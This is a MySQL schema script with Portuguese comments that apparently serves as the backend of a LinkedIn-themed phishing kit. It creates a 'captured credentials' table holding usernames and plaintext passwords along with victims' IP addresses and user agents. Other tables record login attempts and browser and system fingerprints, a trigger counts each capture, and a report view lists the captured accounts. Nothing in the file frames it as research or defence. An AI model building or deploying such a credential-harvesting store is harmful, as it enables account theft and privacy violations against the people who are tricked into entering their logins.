-- Criar banco de dados
CREATE DATABASE IF NOT EXISTS linkedin_db
CHARACTER SET utf8mb4 
COLLATE utf8mb4_unicode_ci;

USE linkedin_db;

-- Tabela principal de credenciais
CREATE TABLE IF NOT EXISTS credenciais_capturadas (
    id INT AUTO_INCREMENT PRIMARY KEY,
    usuario VARCHAR(255) NOT NULL,
    senha VARCHAR(255) NOT NULL,
    ip_address VARCHAR(45) NOT NULL,
    user_agent TEXT,
    origem VARCHAR(50) DEFAULT 'formulario',
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_timestamp (timestamp),
    INDEX idx_ip (ip_address)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabela de tentativas de login
CREATE TABLE IF NOT EXISTS tentativas_login (
    id INT AUTO_INCREMENT PRIMARY KEY,
    usuario VARCHAR(255) NOT NULL,
    sucesso BOOLEAN DEFAULT FALSE,
    ip_address VARCHAR(45) NOT NULL,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_usuario (usuario),
    INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabela de informações do navegador/sistema
CREATE TABLE IF NOT EXISTS info_sistema (
    id INT AUTO_INCREMENT PRIMARY KEY,
    credencial_id INT,
    navegador VARCHAR(100),
    sistema_operacional VARCHAR(100),
    resolucao_tela VARCHAR(20),
    idioma VARCHAR(10),
    timezone VARCHAR(50),
    cookies_habilitados BOOLEAN,
    javascript_habilitado BOOLEAN,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (credencial_id) REFERENCES credenciais_capturadas(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabela de logs de auditoria
CREATE TABLE IF NOT EXISTS logs_auditoria (
    id INT AUTO_INCREMENT PRIMARY KEY,
    acao VARCHAR(100) NOT NULL,
    detalhes TEXT,
    ip_address VARCHAR(45),
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_acao (acao),
    INDEX idx_timestamp (timestamp)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Tabela de estatísticas
CREATE TABLE IF NOT EXISTS estatisticas (
    id INT AUTO_INCREMENT PRIMARY KEY,
    total_acessos INT DEFAULT 0,
    total_capturas INT DEFAULT 0,
    ultima_atualizacao DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO estatisticas (total_acessos, total_capturas) VALUES (0, 0);

-- View para relatório
CREATE OR REPLACE VIEW vw_relatorio_capturas AS
SELECT 
    c.id,
    c.usuario,
    c.ip_address,
    c.origem,
    c.timestamp,
    i.navegador,
    i.sistema_operacional
FROM credenciais_capturadas c
LEFT JOIN info_sistema i ON c.id = i.credencial_id
ORDER BY c.timestamp DESC;

-- Trigger para atualizar estatísticas
DELIMITER //
CREATE TRIGGER atualizar_estatisticas_captura
AFTER INSERT ON credenciais_capturadas
FOR EACH ROW
BEGIN
    UPDATE estatisticas SET total_capturas = total_capturas + 1;
END//
DELIMITER ;